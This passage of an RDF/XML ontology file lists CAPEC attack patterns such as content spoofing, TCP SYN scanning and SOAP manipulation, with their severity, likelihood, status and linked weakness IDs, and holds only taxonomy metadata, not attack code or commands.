                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack147">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#148">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Content Spoofing"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::345::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful content spoofing attack compromises the integrity of the application data.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack320">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#208">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:207::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Removing/short-circuiting &apos;Purse&apos; logic: removing/mutating &apos;cash&apos; decrements"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::602::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack294">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#388">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:386::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Application API Button Hijacking"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack258">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#395">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:390::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Bypassing Electronic Locks and Access Controls"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack373">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#277">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:272::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Data Interchange Protocol Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::707::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack239">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#167">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:188::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#White Box Reverse Engineering"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack226">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#398">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:395::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Magnetic Strip Card Brute Force Attacks"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack207">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#638">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:452::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Altered Component Firmware"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack271">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#385">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:384::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Transaction or Event Tampering via Application API Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack235">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#181">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:103::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Flash File Overlay"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::1021::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack506">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#324">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP (ISN) Sequence Predictability Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack491">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#318">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:312::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#IP &apos;ID&apos; Echoed Byte-Order Probe"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack186">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#287">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:300::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP SYN Scan"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other A successful attack of this kind can identify open ports and available services on a system.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack169">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#294">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Address Mask Request"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Hide Activities::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack176">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#194">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:151::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Fake the Source of Data"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::287::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Alter Execution Logic:NOTE:Integrity Alter Execution Logic By faking the source of data or services  an adversary can cause a target to make incorrect decisions about how to proceed.::SCOPE:IntegrityTECHNICAL IMPACT:Gain Privileges:NOTE:Integrity Gain Privileges By impersonating identities that have an increased level of access  an adversary gain privilege that they many not have otherwise had.::SCOPE:IntegrityTECHNICAL IMPACT:Hide Activities:NOTE:Integrity Hide Activities Faking the source of data or services can be used to create a false trail in logs as the target will associate any actions with the impersonated identity instead of the adversary.::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack163">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#292">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:169::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Host Discovery"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack338">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#439">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Manipulation During Distribution"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack416">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#279">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:278::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#SOAP Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::707::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack480">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#263">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:17::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Force Use of Corrupted Files"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack516">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#434">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:427::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Target Influence via Interview and Interrogation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack90">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#162">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:77::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating Hidden Fields"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::602::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack80">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#401">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:440::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Hacking Hardware"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack61">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#313">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:224::"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Passive OS Fingerprinting"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies>
                      <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Hide Activities::"/>
                    </j.0:implies>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack439">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#206">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:68::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Signing Malicious Code"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits>
                      <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::732::"/>
                    </j.0:exploits>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack251">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#153">
                        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#Input Data Manipulation"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
                    <j.0:exploits rdf:resource="http://krstProj.com/capec#::20::"/>
                    <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
                    <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
                  </j.0:Attack>
                </j.0:reduces>
                <j.0:reduces>
                  <j.0:Attack rdf:about="http://krstProj.com/capec#attack110">
                    <j.0:relatedTo>
                      <j.0:Id rdf:about="http://krstProj.com/capec#596">
                        <j.0:relatedPattern>
                          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:595::"/>
                        </j.0:relatedPattern>
                        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
                        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
                        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
                        <j.0:hasName>
                          <j.0:Name rdf:about="http://krstProj.com/capec#TCP RST Injection"/>
                        </j.0:hasName>
                      </j.0:Id>
                    </j.0:relatedTo>
